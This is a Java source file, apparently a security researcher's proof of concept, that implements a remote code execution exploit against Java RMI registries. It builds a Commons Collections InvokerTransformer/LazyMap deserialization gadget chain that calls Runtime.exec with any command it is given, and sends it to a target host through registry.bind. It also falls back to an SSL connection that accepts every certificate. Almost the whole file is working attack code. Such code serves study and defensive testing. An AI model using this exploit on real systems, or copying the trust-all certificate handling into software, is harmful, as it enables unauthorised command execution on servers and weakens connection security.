package cc.saferoad.rmi;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIClientSocketFactory;
import java.security.cert.X509Certificate;
import java.util.HashMap;
import java.util.Map;

import static cc.saferoad.rmi.RMIServer.RMI_HOST;
import static cc.saferoad.rmi.RMIServer.RMI_PORT;
/*
@auther S0cke3t
@date 2021-11-17
*/

public class RMIDeserializationClient {
    // 定义AnnotationInvocationHandler类常量
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    /**
     * 信任SSL证书
     */
    private static class TrustAllSSL implements X509TrustManager {

        private static final X509Certificate[] ANY_CA = {};

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return ANY_CA;
        }

        @Override
        public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }

        @Override
        public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }

    }

    /**
     * 创建支持SSL的RMI客户端
     */
    private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
        @Override
        public Socket createSocket(String host, int port) throws IOException {
            try {
                // 获取SSLContext对象
                SSLContext ctx = SSLContext.getInstance("TLS");

                // 默认信任服务器端SSL
                ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null);

                // 获取SSL Socket连接工厂
                SSLSocketFactory factory = ctx.getSocketFactory();

                // 创建SSL连接
                return factory.createSocket(host, port);
            } catch (Exception e) {
                throw new IOException(e);
            }
        }
    }

    /**
     * 使用动态代理生成基于InvokerTransformer/LazyMap的Payload
     *
     * @param command 定义需要执行的CMD
     * @return Payload
     * @throws Exception 生成Payload异常
     */
    public static InvocationHandler genPayload(String command) throws Exception {
        // 创建Runtime.getRuntime.exec(cmd)调用链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
        };

        // 创建ChainedTransformer调用链对象
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 使用LazyMap创建一个含有恶意调用链的Transformer类的Map对象
        final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);

        // 获取AnnotationInvocationHandler类对象
        Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);

        // 获取AnnotationInvocationHandler类的构造方法
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

        // 设置构造方法的访问权限
        constructor.setAccessible(true);

        // 实例化AnnotationInvocationHandler，
        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, lazyMap);
        InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        // 使用动态代理创建出Map类型的Payload
        final Map mapProxy2 = (Map) Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annHandler
        );

        // 实例化AnnotationInvocationHandler，
        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, mapProxy2);
        return (InvocationHandler) constructor.newInstance(Override.class, mapProxy2);
    }


    /**
     * 执行Payload
     *
     * @param registry RMI Registry
     * @param command  需要执行的命令
     * @throws Exception Payload执行异常
     */
    public static void exploit(final Registry registry, final String command) throws Exception {
        // 生成Payload动态代理对象
        Object payload = genPayload(command);
        String name    = "test" + System.nanoTime();

        // 创建一个含有Payload的恶意map
        Map<String, Object> map = new HashMap();
        map.put(name, payload);

        // 获取AnnotationInvocationHandler类对象
        Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);

        // 获取AnnotationInvocationHandler类的构造方法
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

        // 设置构造方法的访问权限
        constructor.setAccessible(true);

        // 实例化AnnotationInvocationHandler，
        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, map);
        InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, map);

        // 使用动态代理创建出Remote类型的Payload
        Remote remote = (Remote) Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, annHandler
        );

        try {
            // 发送Payload
            registry.bind(name, remote);
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception{
        if (args.length == 0) {
            // 如果不指定连接参数默认连接本地RMI服务
            args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), "calc.exe"};
        }

        // 远程RMI服务IP
        final String host = args[0];

        // 远程RMI服务端口
        final int port = Integer.parseInt(args[1]);

        // 需要执行的系统命令
        final String command = args[2];

        // 获取远程Registry对象的引用
        Registry registry = LocateRegistry.getRegistry(host, port);

        try {
            // 获取RMI服务注册列表(主要是为了测试RMI连接是否正常)
            String[] regs = registry.list();

            for (String reg : regs) {
                System.out.println("RMI:" + reg);
            }
        } catch (ConnectIOException ex) {
            // 如果连接异常尝试使用SSL建立SSL连接,忽略证书信任错误，默认信任SSL证书
            registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
        }

        // 执行payload
        exploit(registry, command);
    }
}
